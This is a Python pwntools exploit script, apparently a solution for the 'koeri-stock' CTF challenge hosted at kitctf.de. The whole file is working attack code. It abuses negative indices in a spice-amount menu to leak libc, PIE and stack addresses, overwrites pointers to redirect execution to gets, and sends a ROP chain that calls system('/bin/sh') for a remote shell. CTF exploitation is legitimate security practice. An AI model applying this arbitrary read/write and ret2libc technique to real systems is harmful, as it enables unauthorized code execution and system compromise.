from pwn import *
context.log_level='debug'
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# p=process('./main')
p = remote("koeri-stock-0.chals.kitctf.de",1337,ssl=True)
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)
def cmd(c):
    sla(b"Exit\n",str(c).encode())
def add(idx,val,x=0):
    cmd(1)
    sla(b"Spice N\n",str(idx).encode())
    if x==0:
        sla(b"Amount\n",str(val).encode()) 
def sub(idx,val):
    cmd(2)
    sla(b"Spice N\n",str(idx).encode())
    sla(b"Amount\n",str(val).encode())
def show():
    cmd(3)
def leak(off):
    sub(-10+off,0)
    tmp = p.readline()
    if b"Error" in tmp:
        print("Negative")
        tmp = tmp[8:]
        tmp = 0x100000000-int(tmp.split(b" ")[0])
        p1 = tmp
    else:
        print("Positive")
        sub(-10+off,0x7fffffff)
        ru(b"Error, -")
        p1 = 0x80000000-(int(ru(b' ')[:-1]))-1
    return p1
def aar(off):
    p1= leak(off*2)
    p2= leak(off*2+1)
    return p1+(p2<<32)
def aaw(off,src,dst):
    p1 = src&0xffffffff
    p2 = src>>32
    q1 = dst&0xffffffff
    q2 = dst>>32
    target = off*2-10
    if q1>p1:
        add(target,q1-p1)
    else:
        add(target,0x100000000-p1+q1)
    if q2>p2:
        add(target+1,q2-p2)
    else:
        add(target+1,0x100000000-p2+q2)

base = aar(-12)-0x887e3
pie = aar(-15)-0x2033
stack = aar(-10)
warning(hex(pie))
warning(hex(base))
warning(hex(stack))

sys = 0x4e520+base
sh  = 0x1b61b4+base
rdi = 0x23b65+base
ret = 0x233d1+base
gets = 0x7c0a0+base
getch = 0x7ffff7e37540-0x7ffff7db4000+base
aaw(2,0x178+stack,gets)
aaw(1,0,getch)
add(-10,0x8f)
sl(p64(ret)*0x100+flat([rdi,sh,sys]))
p.interactive()
